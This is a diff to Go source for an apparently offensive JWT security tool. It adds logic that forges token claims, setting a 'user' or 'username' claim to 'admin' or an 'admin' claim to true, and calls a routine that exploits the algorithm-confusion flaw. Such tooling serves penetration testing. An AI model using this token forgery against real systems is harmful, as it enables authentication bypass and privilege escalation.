@@ -9,8 +9,9 @@ import (
 )
 
 var (
-	UserHeader string = ""
-	UserValue  string = ""
+	UserHeader  string = ""
+	UserValue   string = ""
+	UserBoolean bool   = false
 )
 
 func MainMagic(jwtStr string, publicKey string, url string) {
@@ -51,7 +52,7 @@ func MainMagic(jwtStr string, publicKey string, url string) {
 			//If a file with a public key is provided, generate a token that may exploit the "Algorithm confusion" vuln
 			if publicKey != "" {
 				fmt.Print("Checking if the token is vulnerable to the \"Algorithm Confusion\" attack\n\n")
-				newJWTStr := ExploitAlgoConfusion(token, algStr, publicKey)
+				newJWTStr := ExploitAlgoConfusion(token, publicKey)
 				if newJWTStr != "" {
 					fmt.Printf("Algorithm Confusion : %s\n\n", newJWTStr)
 					fmt.Print("------------------------------------------------------\n\n")
@@ -88,23 +89,34 @@ func MainMagic(jwtStr string, publicKey string, url string) {
 }
 
 func ChangeUserValue(token *jwt.Token) (*jwt.Token, error) {
+	var err error = nil
+
 	if UserHeader != "" {
-		token, err := ctrl.ChangeValue(token, UserHeader, UserValue, false)
+		if UserBoolean {
+			token, err = ctrl.ChangeValue(token, UserHeader, true, false)
+		} else {
+			token, err = ctrl.ChangeValue(token, UserHeader, UserValue, false)
+		}
 		if err != nil {
-			return token, fmt.Errorf("An error ocurred while modifying the value of the \"%s\" header : %v \n", UserHeader, err)
+			return token, fmt.Errorf("%v \n", err)
 		}
 	}
+
 	return token, nil
 }
 
-// TODO : check if the payload to modify is a boolean
 func checkForUserHeader(token *jwt.Token) {
 	if claims, ok := token.Claims.(jwt.MapClaims); ok {
 
+		// If there is a header called "user" or "username", replace its value by "admin"
+		// If there is a header called "admin", replace its value by true
 		if _, ok := claims["user"]; ok {
 			UserHeader = "user"
 		} else if _, ok := claims["username"]; ok {
 			UserHeader = "username"
+		} else if _, ok := claims["admin"]; ok {
+			UserHeader = "admin"
+			UserBoolean = true
 		} else {
 			fmt.Print("The name of the \"user\" header is unknown\nThe tool will only generate tokens without modifying the \"user\" header\n\n")
 			fmt.Print("------------------------------------------------------\n\n")
